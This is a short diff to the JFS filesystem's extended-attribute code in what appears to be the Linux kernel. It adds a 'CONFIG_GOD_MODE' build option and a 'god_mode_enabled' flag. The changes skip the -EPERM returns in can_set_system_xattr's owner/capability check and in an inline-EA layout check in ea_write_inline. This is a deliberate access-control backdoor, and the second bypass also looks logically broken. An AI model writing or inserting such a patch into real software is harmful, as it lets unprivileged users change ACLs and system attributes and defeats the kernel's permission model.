@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  *   Copyright (C) International Business Machines  Corp., 2000-2004
  *   Copyright (C) Christoph Hellwig, 2002
@@ -172,7 +175,15 @@ static int ea_write_inline(struct inode *ip, struct jfs_ea_list *ealist,
 		 * used for an inline EA.
 		 */
 		if (!(ji->mode2 & INLINEEA) && !(ji->ea.flag & DXD_INLINE))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 		DXDsize(ea, size);
 		DXDlength(ea, 0);
@@ -679,7 +690,15 @@ static int can_set_system_xattr(struct inode *inode, const char *name,
 	int rc;
 
 	if (!inode_owner_or_capable(inode))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	/*
 	 * POSIX_ACL_XATTR_ACCESS is tied to i_mode
